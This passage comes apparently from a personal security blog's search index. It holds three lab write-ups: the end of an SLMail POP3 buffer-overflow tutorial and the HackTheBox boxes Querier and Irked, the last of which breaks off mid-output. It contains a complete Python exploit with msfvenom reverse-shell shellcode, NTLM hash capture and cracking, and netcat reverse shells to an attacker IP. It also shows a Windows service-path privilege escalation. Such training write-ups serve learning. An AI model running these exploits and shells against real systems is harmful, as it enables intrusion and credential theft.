\u0026ldquo;reverse-shell\u0026rdquo;. It forces the victim to call back to our attacker machine.\nOur \u0026ldquo;Kali VM\u0026rdquo; has all the tools we need for that. I used \u0026ldquo;msfvenom\u0026rdquo; for this task.\nmsfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.18 LPORT=4444 -b '\\x00\\x0a\\x0d' -f python\nI generated \u0026ldquo;shellcode\u0026rdquo; for \u0026ldquo;32Bit (x86)\u0026rdquo; architecture, platform \u0026ldquo;windows\u0026rdquo;. The payload is a \u0026ldquo;unstaged reverse_tcp shell\u0026rdquo;. The attacker machines \u0026ldquo;IP\u0026rdquo; and \u0026ldquo;port\u0026rdquo; and last but not least I specified the \u0026ldquo;BadChars\u0026rdquo;. Those will be avoided by \u0026ldquo;msfvenom\u0026rdquo; when generating the \u0026ldquo;shellcode\u0026rdquo;. The output looks like this:\nI copied that over into my exploit and added a bunch of b' because I am using python3. I also renamed the \u0026ldquo;buffer\u0026rdquo; variable into \u0026ldquo;junk\u0026rdquo; for our \u0026ldquo;4654 byte\u0026rdquo; of data and \u0026ldquo;EIP\u0026rdquo; for our \u0026ldquo;EIP-Overwrite\u0026rdquo;.\nWe are almost there. Just two more things are needed. It\u0026rsquo;s the address of a JMP ESP or CALL ESP instruction and a NOP-Sled. This sound worse than it is!\nJMP ESP # As I\u0026rsquo;ve explained earlier, we not only overwrote \u0026ldquo;EIP\u0026rdquo; but wrote \u0026ldquo;C\u0026rsquo;s\u0026rdquo; past that point. We removed the \u0026ldquo;C\u0026rsquo;s\u0026rdquo; now and will send our \u0026ldquo;shellcode\u0026rdquo; instead. The questions is now: How can we access our \u0026ldquo;shellcode\u0026rdquo;? Well, we control \u0026ldquo;EIP\u0026rdquo; and could put the address in there where our \u0026ldquo;shellcode\u0026rdquo; starts. However in most cases you can\u0026rsquo;t put the address in there directly. The address might change. But we are lucky. Our \u0026ldquo;payload\u0026rdquo; resides by chance in the right spot.\nThe register \u0026ldquo;ESP\u0026rdquo; which I told you about at the beginning holds the address to our \u0026ldquo;shellcode\u0026rdquo;. To proof that I run the newest version of the \u0026ldquo;exploit\u0026rdquo; again.\n#!/usr/bin/python3 # Import of the socket library to connect to the POP3 service import socket # Victim IP and Port host = \u0026#34;192.168.1.14\u0026#34; port = 110 # POC Buffer junk = b\u0026#39;A\u0026#39; * 4654 eip = b\u0026#39;B\u0026#39; * 4 buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xdb\\xd9\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\\xb1\\x52\\xbd\\xad\u0026#34; buf += b\u0026#34;\\x99\\x49\\x27\\x31\\x6f\\x17\\x83\\xc7\\x04\\x03\\xc2\\x8a\\xab\u0026#34; buf += b\u0026#34;\\xd2\\xe0\\x45\\xa9\\x1d\\x18\\x96\\xce\\x94\\xfd\\xa7\\xce\\xc3\u0026#34; buf += b\u0026#34;\\x76\\x97\\xfe\\x80\\xda\\x14\\x74\\xc4\\xce\\xaf\\xf8\\xc1\\xe1\u0026#34; buf += b\u0026#34;\\x18\\xb6\\x37\\xcc\\x99\\xeb\\x04\\x4f\\x1a\\xf6\\x58\\xaf\\x23\u0026#34; buf += b\u0026#34;\\x39\\xad\\xae\\x64\\x24\\x5c\\xe2\\x3d\\x22\\xf3\\x12\\x49\\x7e\u0026#34; buf += b\u0026#34;\\xc8\\x99\\x01\\x6e\\x48\\x7e\\xd1\\x91\\x79\\xd1\\x69\\xc8\\x59\u0026#34; buf += b\u0026#34;\\xd0\\xbe\\x60\\xd0\\xca\\xa3\\x4d\\xaa\\x61\\x17\\x39\\x2d\\xa3\u0026#34; buf += b\u0026#34;\\x69\\xc2\\x82\\x8a\\x45\\x31\\xda\\xcb\\x62\\xaa\\xa9\\x25\\x91\u0026#34; buf += b\u0026#34;\\x57\\xaa\\xf2\\xeb\\x83\\x3f\\xe0\\x4c\\x47\\xe7\\xcc\\x6d\\x84\u0026#34; buf += b\u0026#34;\\x7e\\x87\\x62\\x61\\xf4\\xcf\\x66\\x74\\xd9\\x64\\x92\\xfd\\xdc\u0026#34; buf += b\u0026#34;\\xaa\\x12\\x45\\xfb\\x6e\\x7e\\x1d\\x62\\x37\\xda\\xf0\\x9b\\x27\u0026#34; buf += b\u0026#34;\\x85\\xad\\x39\\x2c\\x28\\xb9\\x33\\x6f\\x25\\x0e\\x7e\\x8f\\xb5\u0026#34; buf += b\u0026#34;\\x18\\x09\\xfc\\x87\\x87\\xa1\\x6a\\xa4\\x40\\x6c\\x6d\\xcb\\x7a\u0026#34; buf += b\u0026#34;\\xc8\\xe1\\x32\\x85\\x29\\x28\\xf1\\xd1\\x79\\x42\\xd0\\x59\\x12\u0026#34; buf += b\u0026#34;\\x92\\xdd\\x8f\\xb5\\xc2\\x71\\x60\\x76\\xb2\\x31\\xd0\\x1e\\xd8\u0026#34; buf += b\u0026#34;\\xbd\\x0f\\x3e\\xe3\\x17\\x38\\xd5\\x1e\\xf0\\x87\\x82\\x21\\x12\u0026#34; buf += b\u0026#34;\\x60\\xd1\\x21\\x03\\x2c\\x5c\\xc7\\x49\\xdc\\x08\\x50\\xe6\\x45\u0026#34; buf += b\u0026#34;\\x11\\x2a\\x97\\x8a\\x8f\\x57\\x97\\x01\\x3c\\xa8\\x56\\xe2\\x49\u0026#34; buf += b\u0026#34;\\xba\\x0f\\x02\\x04\\xe0\\x86\\x1d\\xb2\\x8c\\x45\\x8f\\x59\\x4c\u0026#34; buf += b\u0026#34;\\x03\\xac\\xf5\\x1b\\x44\\x02\\x0c\\xc9\\x78\\x3d\\xa6\\xef\\x80\u0026#34; buf += b\u0026#34;\\xdb\\x81\\xab\\x5e\\x18\\x0f\\x32\\x12\\x24\\x2b\\x24\\xea\\xa5\u0026#34; buf += b\u0026#34;\\x77\\x10\\xa2\\xf3\\x21\\xce\\x04\\xaa\\x83\\xb8\\xde\\x01\\x4a\u0026#34; buf += b\u0026#34;\\x2c\\xa6\\x69\\x4d\\x2a\\xa7\\xa7\\x3b\\xd2\\x16\\x1e\\x7a\\xed\u0026#34; buf += b\u0026#34;\\x97\\xf6\\x8a\\x96\\xc5\\x66\\x74\\x4d\\x4e\\x96\\x3f\\xcf\\xe7\u0026#34; buf += b\u0026#34;\\x3f\\xe6\\x9a\\xb5\\x5d\\x19\\x71\\xf9\\x5b\\x9a\\x73\\x82\\x9f\u0026#34; buf += b\u0026#34;\\x82\\xf6\\x87\\xe4\\x04\\xeb\\xf5\\x75\\xe1\\x0b\\xa9\\x76\\x20\u0026#34; # Build exploit buffer out of the junk data (\u0026#39;A\u0026#39;s), eip address (\u0026#39;B\u0026#39;s), shellcode buffer = junk + eip + buf # Build a TCP SOCKET (stream) and use it to connect to victim IP \u0026amp; Port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) data = s.recv(1024) print(data) # Send USER command with Username x41 s.send(b\u0026#39;USER x41\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Send PASS command with our buffer s.send(b\u0026#39;PASS \u0026#39; + buffer + b\u0026#39;\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Close connection s.close() We could write an address into \u0026ldquo;EIP\u0026rdquo; that leads to a JMP ESP or CALL ESP instruction. This indirect method avoids hard-coding a \u0026ldquo;stack\u0026rdquo; address that\u0026rsquo;s constantly changing. These instructions can be found in \u0026ldquo;DLL\u0026rsquo;s\u0026rdquo; that the program or operating system ships. Using the \u0026ldquo;Windows DLL\u0026rsquo;s\u0026rdquo; is not always a good idea. The reason why you want to avoid \u0026ldquo;Windows DLL\u0026rsquo;s\u0026rdquo; is because they have \u0026ldquo;ASLR\u0026rdquo; (Address-Space-Layout-Randomization) enabled. This will prevent simple exploits like this because the JMP ESP instruction won\u0026rsquo;t be at the same location every time. Try it with this \u0026ldquo;exploit\u0026rdquo; later on a \u0026ldquo;Windows 10\u0026rdquo; machine. It will work just fine until you reboot.\nYou can read a good explaination here.\nI wasn\u0026rsquo;t able to find a way to avoid using a \u0026ldquo;Windows DLL\u0026rdquo; so far. For simplicity I just picked SHELL32.dll. You click the \u0026ldquo;E\u0026rdquo; button in \u0026ldquo;OllyDbg\u0026rsquo;s\u0026rdquo; toolbar and get a list of \u0026ldquo;DLL\u0026rsquo;s\u0026rdquo;. Locate SHELL32.dll and double-click it.\nNow right-click in the top-left pane and \u0026ldquo;search for \u0026hellip; Command\u0026rdquo;. In that box you type JMP ESP.\nOnce found, we put that address into our \u0026ldquo;exploit\u0026rdquo; instead of the \u0026ldquo;B\u0026rsquo;s\u0026rdquo;.\neip = b\u0026#39;\\x5C\\xCB\\xCE\\x75\u0026#39; I formatted the address in the same \u0026ldquo;hex-notation\u0026rdquo; as the \u0026ldquo;shellcode\u0026rdquo; and also wrote the values backwards. This is because INTEL CPU\u0026rsquo;s are working in \u0026ldquo;little endian\u0026rdquo; format. Please check wikipedia for that. It\u0026rsquo;s just which byte is the least significant one.\nNOP # Adding NOPs is probably the easiest part.\nnop = b\u0026#39;\\x90\u0026#39; * 20 NOP stands for \u0026ldquo;no operation\u0026rdquo;. The \u0026ldquo;CPU\u0026rdquo; just skips those and moves on. Using those makes the \u0026ldquo;exploit\u0026rdquo; a bit more reliable, because after we JMP ESP we try to land into our NOPs and slide down into our \u0026ldquo;shellcode\u0026rdquo;. Just in case something moved on the \u0026ldquo;stack\u0026rdquo;.\nExploit # That\u0026rsquo;s about it. Now comes the moment of truth. Did everything work out? Let me show you the finished \u0026ldquo;exploit\u0026rdquo; and then if we can pop a shell.\n#!/usr/bin/python3 # Import of the socket library to connect to the POP3 service import socket # Victim IP and Port host = \u0026#34;192.168.1.14\u0026#34; port = 110 # POC Buffer junk = b\u0026#39;A\u0026#39; * 4654 eip = b\u0026#39;\\x5C\\xCB\\xCE\\x75\u0026#39; nop = b\u0026#39;\\x90\u0026#39; * 20 buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xdb\\xd9\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\\xb1\\x52\\xbd\\xad\u0026#34; buf += b\u0026#34;\\x99\\x49\\x27\\x31\\x6f\\x17\\x83\\xc7\\x04\\x03\\xc2\\x8a\\xab\u0026#34; buf += b\u0026#34;\\xd2\\xe0\\x45\\xa9\\x1d\\x18\\x96\\xce\\x94\\xfd\\xa7\\xce\\xc3\u0026#34; buf += b\u0026#34;\\x76\\x97\\xfe\\x80\\xda\\x14\\x74\\xc4\\xce\\xaf\\xf8\\xc1\\xe1\u0026#34; buf += b\u0026#34;\\x18\\xb6\\x37\\xcc\\x99\\xeb\\x04\\x4f\\x1a\\xf6\\x58\\xaf\\x23\u0026#34; buf += b\u0026#34;\\x39\\xad\\xae\\x64\\x24\\x5c\\xe2\\x3d\\x22\\xf3\\x12\\x49\\x7e\u0026#34; buf += b\u0026#34;\\xc8\\x99\\x01\\x6e\\x48\\x7e\\xd1\\x91\\x79\\xd1\\x69\\xc8\\x59\u0026#34; buf += b\u0026#34;\\xd0\\xbe\\x60\\xd0\\xca\\xa3\\x4d\\xaa\\x61\\x17\\x39\\x2d\\xa3\u0026#34; buf += b\u0026#34;\\x69\\xc2\\x82\\x8a\\x45\\x31\\xda\\xcb\\x62\\xaa\\xa9\\x25\\x91\u0026#34; buf += b\u0026#34;\\x57\\xaa\\xf2\\xeb\\x83\\x3f\\xe0\\x4c\\x47\\xe7\\xcc\\x6d\\x84\u0026#34; buf += b\u0026#34;\\x7e\\x87\\x62\\x61\\xf4\\xcf\\x66\\x74\\xd9\\x64\\x92\\xfd\\xdc\u0026#34; buf += b\u0026#34;\\xaa\\x12\\x45\\xfb\\x6e\\x7e\\x1d\\x62\\x37\\xda\\xf0\\x9b\\x27\u0026#34; buf += b\u0026#34;\\x85\\xad\\x39\\x2c\\x28\\xb9\\x33\\x6f\\x25\\x0e\\x7e\\x8f\\xb5\u0026#34; buf += b\u0026#34;\\x18\\x09\\xfc\\x87\\x87\\xa1\\x6a\\xa4\\x40\\x6c\\x6d\\xcb\\x7a\u0026#34; buf += b\u0026#34;\\xc8\\xe1\\x32\\x85\\x29\\x28\\xf1\\xd1\\x79\\x42\\xd0\\x59\\x12\u0026#34; buf += b\u0026#34;\\x92\\xdd\\x8f\\xb5\\xc2\\x71\\x60\\x76\\xb2\\x31\\xd0\\x1e\\xd8\u0026#34; buf += b\u0026#34;\\xbd\\x0f\\x3e\\xe3\\x17\\x38\\xd5\\x1e\\xf0\\x87\\x82\\x21\\x12\u0026#34; buf += b\u0026#34;\\x60\\xd1\\x21\\x03\\x2c\\x5c\\xc7\\x49\\xdc\\x08\\x50\\xe6\\x45\u0026#34; buf += b\u0026#34;\\x11\\x2a\\x97\\x8a\\x8f\\x57\\x97\\x01\\x3c\\xa8\\x56\\xe2\\x49\u0026#34; buf += b\u0026#34;\\xba\\x0f\\x02\\x04\\xe0\\x86\\x1d\\xb2\\x8c\\x45\\x8f\\x59\\x4c\u0026#34; buf += b\u0026#34;\\x03\\xac\\xf5\\x1b\\x44\\x02\\x0c\\xc9\\x78\\x3d\\xa6\\xef\\x80\u0026#34; buf += b\u0026#34;\\xdb\\x81\\xab\\x5e\\x18\\x0f\\x32\\x12\\x24\\x2b\\x24\\xea\\xa5\u0026#34; buf += b\u0026#34;\\x77\\x10\\xa2\\xf3\\x21\\xce\\x04\\xaa\\x83\\xb8\\xde\\x01\\x4a\u0026#34; buf += b\u0026#34;\\x2c\\xa6\\x69\\x4d\\x2a\\xa7\\xa7\\x3b\\xd2\\x16\\x1e\\x7a\\xed\u0026#34; buf += b\u0026#34;\\x97\\xf6\\x8a\\x96\\xc5\\x66\\x74\\x4d\\x4e\\x96\\x3f\\xcf\\xe7\u0026#34; buf += b\u0026#34;\\x3f\\xe6\\x9a\\xb5\\x5d\\x19\\x71\\xf9\\x5b\\x9a\\x73\\x82\\x9f\u0026#34; buf += b\u0026#34;\\x82\\xf6\\x87\\xe4\\x04\\xeb\\xf5\\x75\\xe1\\x0b\\xa9\\x76\\x20\u0026#34; # Build exploit buffer out of the junk data (\u0026#39;A\u0026#39;s), eip containing \u0026#39;JMP ESP\u0026#39;, NOPs and shellcode buffer = junk + eip + nop + buf # Build a TCP SOCKET (stream) and use it to connect to victim IP \u0026amp; Port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) data = s.recv(1024) print(data) # Send USER command with Username x41 s.send(b\u0026#39;USER x41\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Send PASS command with our buffer s.send(b\u0026#39;PASS \u0026#39; + buffer + b\u0026#39;\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Close connection s.close() Before we run the \u0026ldquo;exploit\u0026rdquo; we start a \u0026ldquo;nc listener\u0026rdquo; to receive the \u0026ldquo;reverse-shell\u0026rdquo;.\nnc -lnvp 4444\nNow we run the \u0026ldquo;exploit\u0026rdquo;:\nAnd it worked! :)\nIn the next screenshot you can see how the \u0026ldquo;stack\u0026rdquo; and \u0026ldquo;registers\u0026rdquo; look like just one step before we jump into our NOPs.\nCan you spot the important sections? The NOPs? What address ESP and EIP hold? I leave that to you now.\nI will try to make this exploit better over time (if possible) to challenge myself. I tried already with not using the shell32.dll but the \u0026ldquo;DLL\u0026rsquo;s\u0026rdquo; I tried didn\u0026rsquo;t even had a JMP ESP or CALL ESP instruction in it. Don\u0026rsquo;t know why. But that\u0026rsquo;s why I learn, right?! ;)\nUpdate 1.1 # After uploading this entry I fixed a couple of typos and other errors. But I also learned a couple of new tricks.\nNo crashes anymore! # When you create your shellcode and specify EXITFUNC=thread the threaded \u0026ldquo;SLMail\u0026rdquo; process won\u0026rsquo;t crash completely when exiting the \u0026ldquo;reverse-shell\u0026rdquo;.\nmsfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.18 LPORT=4444 -b '\\x00\\x0a\\x0d' EXITFUNC=thread -f python\nJMP ESP! # I played a bit with \u0026ldquo;Immunity Debugger\u0026rdquo; in combination with the extention \u0026ldquo;mona.py\u0026rdquo; instead of \u0026ldquo;OllyDbg\u0026rdquo;. With \u0026ldquo;mona.py\u0026rdquo; I was able to find a JMP ESP in SLMFC.dll with this command:\n!mona find -type instr -s \u0026quot;jmp esp\u0026quot; -m slmfc.dll\nI was curious why \u0026ldquo;mona\u0026rdquo; was able to find 19! of those while the search I used, didn\u0026rsquo;t. So I poked around and noticed that my old search was done in an address space that differed from the ones where \u0026ldquo;mona\u0026rdquo; found the JMP ESP instructions.\nSo I think \u0026ldquo;mona\u0026rdquo; searches all sections, while the search command does not.\nI was able to find the instruction manually in the .rdata section of the .dll.\nAfter updating and testing my exploit, I can say: It\u0026rsquo;s working like a charm! No crashing service anymore and it survives reboots now too.\nTill next time.\nx41\n[Top]\n"},{"id":11,"href":"/posts/querier/","title":"Querier - WriteUp","section":"Blog","content":" External Recon # I started with my usual \u0026ldquo;nmap\u0026rdquo; scan:\n$ nmap -sC -sV -oN initial 10.10.10.125 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 14.00.1000.00 | ms-sql-ntlm-info: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: QUERIER | DNS_Domain_Name: HTB.LOCAL | DNS_Computer_Name: QUERIER.HTB.LOCAL | DNS_Tree_Name: HTB.LOCAL |_ Product_Version: 10.0.17763 I reduced the output to the interesting pieces. As we found some \u0026ldquo;DNS-Names\u0026rdquo; I put them into my \u0026ldquo;/etc/hosts\u0026rdquo; file.\n$nano /etc/hosts 10.10.10.125 querier.htb.local querier After my initial scan, I proceeded with a script-scan. Especialy when I see \u0026ldquo;port 445\u0026rdquo; open. \u0026ldquo;Port 445\u0026rdquo; is used for \u0026ldquo;SMB\u0026rdquo; or filesharing on Windows.\nBut this time the \u0026ldquo;nmap\u0026rdquo; scripts failed to identify anything usefull on this port. A deadend?\nAs I couldn\u0026rsquo;t find anything else on the box, I tried another tool to check the \u0026ldquo;SMB-Service\u0026rdquo;: \u0026ldquo;Metasploit\u0026rdquo;.\n$ msfconsole msf5 use auxiliary/scanner/smb/smb_enumshares msf5 auxiliary(scanner/smb/smb_enumshares) \u0026gt; set RHOSTS 10.10.10.125 msf5 run [+] 10.10.10.125:445 - ADMIN$ - (DS) Remote Admin [+] 10.10.10.125:445 - C$ - (DS) Default share [+] 10.10.10.125:445 - IPC$ - (I) Remote IPC [+] 10.10.10.125:445 - Reports - (DS) Note to self: It\u0026rsquo;s always a good idea to check and recheck your services with different tools. ;)\n[Top]\nExplore # I used the the file explorer to connect as an anonymous user.\nThe file has a \u0026ldquo;.xlsm\u0026rdquo; extension. Which means it should have a macro inside. Which turned out to be true once I opened the file.\nLet\u0026rsquo;s investigate the macro.\nHere are the important \u0026ldquo;SQL-Connection\u0026rdquo; bits:\nTrusted_Connection=no; Database=volume; Uid=reporting; Pwd=PcwTWTHRwryjc$c6 [Top]\nWeaponize # Obviously I wanted to connect to the database now. For tasks like this I use the \u0026ldquo;impacket\u0026rdquo; toolset.\n./mssqlclient.py -windows-auth reporting@querier\nWhen you have access to a \u0026ldquo;Microsoft-SQL\u0026rdquo; Server, always check for the xp_cmdshell option to run commands on the operating system.\nSQL\u0026gt; xp_cmdshell cmd.exe [-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object \u0026#39;xp_cmdshell\u0026#39;, database \u0026#39;mssqlsystemresource\u0026#39;, schema \u0026#39;sys\u0026#39;. No dice. Permission denied.\nBut, of cause there\u0026rsquo;s a way around that. By pure chance I watched a video of ippsec who had the very same problem in a box earlier that week.\nSo I went back and checked what he did.\nxp_dirtree to the rescue.\nWith xp_dirtree I can list folders and shares. And as Windows loves to do \u0026ldquo;single-sign-on\u0026rdquo; for the user with it\u0026rsquo;s \u0026ldquo;NTLM\u0026rdquo; hash I can try to intercept it.\nIn order to grab the \u0026ldquo;NTLM-Hash\u0026rdquo; I need the tool named \u0026ldquo;responder\u0026rdquo; in one terminal and run the xp_dirtree command for the share created by \u0026ldquo;responder\u0026rdquo; in another terminal.\n-----------Terminal 1-------------- $ responder -I tun0 -wrfv -----------Terminal 2-------------- SQL\u0026gt; exec xp_dirtree \u0026#39;\\\\10.10.14.4\\files\u0026#39; The resulting \u0026ldquo;NTLM-Hash\u0026rdquo; is:\n\u0026ldquo;hashcat\u0026rdquo; cracked the \u0026ldquo;NTLM-Hash\u0026rdquo; for me in mere seconds:\n$ ./hashcat -m 5600 ntlm-hash.txt --force \u0026gt; Password: corporate568 [Top]\nExploit # I used the new credentials again with \u0026ldquo;impacket\u0026rdquo; to login:\n./mssqlclient.py -windows-auth querier/mssql-svc:corporate568@querier\nIf xp_cmdshell will work now?\nSQL\u0026gt; xp_cmdshell cmd.exe [-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure \u0026#39;sys.xp_cmdshell\u0026#39; of component \u0026#39;xp_cmdshell\u0026#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of \u0026#39;xp_cmdshell\u0026#39; by using \u0026#39;sp_configure\u0026#39;. For more information about enabling \u0026#39;xp_cmdshell\u0026#39;, search for \u0026#39;xp_cmdshell\u0026#39; in SQL Server Books Online. Almost. I seem to have to propper permissions now. But I need to enable it.\nSQL\u0026gt; EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1 SQL\u0026gt; RECONFIGURE SQL\u0026gt; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1 SQL\u0026gt; RECONFIGURE This looks promissing. My next goal should be to get a propper \u0026ldquo;reverse-shell\u0026rdquo; and some tools for the next step on the box. I used \u0026ldquo;impacket\u0026rdquo; again to give me a \u0026ldquo;SMB\u0026rdquo; Server which can hold my files. I put \u0026ldquo;nc64.exe\u0026rdquo; and \u0026ldquo;powerup.ps1\u0026rdquo; in that share.\npython /opt/impacket/examples/smbserver.py -smb2support files $(pwd)\nI downloaded them from my box to the target using a LOLBIN.\nSQL\u0026gt; xp_cmdshell esentutl.exe /y \\\\10.10.14.4\\files\\nc64.exe /d C:\\Users\\mssql-svc\\nc64.exe /o SQL\u0026gt; xp_cmdshell esentutl.exe /y \\\\10.10.14.4\\files\\powerup.ps1 /d C:\\Users\\mssql-svc\\powerup.ps1 /o Now the \u0026ldquo;reverse-shell\u0026rdquo;:\n-----------Terminal 1-------------- $ nc -lvnp 9001 -----------Terminal 2-------------- SQL\u0026gt; xp_cmdshell C:\\Users\\mssql-svc\\nc64.exe -e cmd 10.10.14.4 9001 [Top]\nPrivilege Escalation # First, I\u0026rsquo;ve got the user.txt.\nThis time, I haven\u0026rsquo;t spent time in a dedicated \u0026ldquo;internal-recon\u0026rdquo; phase. It was a mixed bag due to the tools I used. The mentioned \u0026ldquo;powerup.ps1\u0026rdquo; script does technicaly both: Recon and Escalation.\nThe module was loaded into \u0026ldquo;powershell\u0026rdquo; like so:\nC:\\Users\\mssql-svc\u0026gt; powershell PS C:\\Users\\mssql-svc\u0026gt; import-module ./powerup.ps1 PS C:\\Users\\mssql-svc\u0026gt; invoke-allchecks I spent quite some time trying to login somehow with the password in the \u0026ldquo;GPP\u0026rdquo;. But I wasn\u0026rsquo;t able to make it work. While doing this writeup however I realized - the password should have worked. Don\u0026rsquo;t know what I did wrong.\nBut there\u0026rsquo;s more than one way to victory: I\u0026rsquo;ve seen the vulnerable service but ignored it for a hopefully quick win with the password. After that failed I gave it a shot.\n[Top]\nRoot Flag # I used \u0026ldquo;powerup.ps1\u0026rdquo; again, to exploit the \u0026ldquo;UsoSvr\u0026rdquo; service.\n-----------Terminal 1-------------- $ nc -lvnp 9002 -----------Terminal 2-------------- PS C:\\Users\\mssql-svc\u0026gt; Set-ServiceBinaryPath -Name UsoSvc -Path \u0026#39;C:\\Users\\mssql-svc\\nc64.exe -e cmd 10.10.14.4 9002\u0026#39; PS C:\\Users\\mssql-svc\u0026gt; restart-service UsoSvc So what happened here? First, let me cite two things of the \u0026ldquo;powerup\u0026rdquo; authors regarding services and improper permissions:\n[1] This misconfiguration happens when the executable associated with a service has improper permissions, allowing other users to write to the .exe. Since these services run as SYSTEM, if we replace the exe with our own, we can escalate quickly.\n[2] Takes a service name [\u0026hellip;] that the current user has configuration modification rights on and executes a series of automated actions to execute commands as SYSTEM.\nAnd this box is no exception. As far as I understand it, the service is vulnerable to the 2nd variant.\nMission Accomplished! :)\n[Top]\n"},{"id":12,"href":"/posts/irked/","title":"Irked - WriteUp","section":"Blog","content":" External Recon # As usual we work our way down the KillChain. Starting with a typical nmap scan.\nnmap -sC -sV -oN inital 10.10.10.117\nThis runs all the default labled nmap scripts, enumerates versions of found services and dumps everything into the file inital. Note that a default nmap scan just does TCP scans and only the top 1000 ports.\nHere\u0026rsquo;s the output of said scan:\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 46965/udp status |_ 100024 1 47229/tcp status Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We note the usual suspects. \u0026ldquo;Port 22/ssh\u0026rdquo; and \u0026ldquo;Port 80/http\u0026rdquo;. \u0026ldquo;Port 111/rpcbind\u0026rdquo; is somewhat unusual.\nSince we found a webservice. Let\u0026rsquo;s fire up gobuster to scan the website for more intel.\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.117 -x txt,php,htm,html\nBut this leads to a dead end. We find just the Apache manual and nothing more.\nSo let\u0026rsquo;s start exploreing what else we\u0026rsquo;ve got so far.\n[Top]\nExplore # #### Port 22: `ssh root@10.10.10.117` Regular ssh service. Nothing special so far. We get promted for a password. Port 80: # Let\u0026rsquo;s look at the Website:\nThis looks like an obvious hint. \u0026ldquo;IRC is almost working\u0026rdquo;. Usualy IRC runs on ports: \u0026ldquo;194/tcp\u0026rdquo; or \u0026ldquo;6667/tcp\u0026rdquo;. We haven\u0026rsquo;t seen those ports yet.\nI thought at this point: \u0026ldquo;Well, perhaps those ports aren\u0026rsquo;t in the default scan of nmap?\u0026rdquo; So let\u0026rsquo;s rescan both ports:\nnmap -sC -sV -p 6667,194 10.10.10.117 PORT STATE SERVICE VERSION 194/tcp closed irc 6667/tcp closed irc Both closed. So, what now\u0026hellip; Port 111: # After all routes led to a dead end so far, it looked like \u0026ldquo;Port 111\u0026rdquo; was the only option left. So I searched for it\u0026rsquo;s intended use, and exploits of it. Long story short: It\u0026rsquo;s nothing of value for this box. If you google for \u0026ldquo;rpcbind / portmapper\u0026rdquo; exploits you find some very old ones. However I wasn\u0026rsquo;t able to accomplish anything with it. I spent a couple of hours on this rabbit hole.\nEventually I resorted to the HackTheBox forums and check the thread for this box. One guy said:\nHave you scanned all the ports\u0026hellip;\nAt this point I was like: \u0026ldquo;Fuck!\u0026rdquo; Sure thing, I haven\u0026rsquo;t scanned all ports on this bitch. So I finally did.\nnmap -p- 10.10.10.117 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 47229/tcp open unknown 65534/tcp open unknown And there we have it. \u0026ldquo;Port 6697\u0026rdquo; is open als looks like IRC is listening.\nLet\u0026rsquo;s check if this is indeed IRC listening here. So I got myself an IRC client. In this case \u0026ldquo;HexChat\u0026rdquo; and conntected to the server.\nAs you can see, I am not only connected, but I also got more intel about the specific IRC version:\nYour host is irked.htb, running version Unreal3.2.8.1\nLet\u0026rsquo;s check \u0026ldquo;searchsploit\u0026rdquo; if there\u0026rsquo;s an exploit already written for this version. It\u0026rsquo;s an easy box afterall.\nsearchsploit unreal -------------------------------------------------------------------- ---------------------------------- | Exploit Title | Path | | | (/usr/share/exploitdb/) | -------------------------------------------------------------------- ---------------------------------- | UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) | exploits/linux/remote/16922.rb | ------------------------------------------------------------------------------------------------------- Seems like it. :) Let\u0026rsquo;s break in!\n[Top]\nExploit # Let\u0026rsquo;s fire up Metasploit. And load the exploit with use exploit. The commands within msf are fairly simple. So I don\u0026rsquo;t write them all down. Here\u0026rsquo;s the finished Exploit including the payload we will try.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 10.10.10.117 yes The target address RPORT 6697 yes The target port (TCP) Payload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.15.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target So let\u0026rsquo;s type \u0026ldquo;exploit\u0026rdquo;, hit enter and sure enough, we get a shell back. Sweet!\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt; exploit [*] Started reverse TCP double handler on 10.10.15.149:4444 [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697... :irked.htb NOTICE AUTH :*** Looking 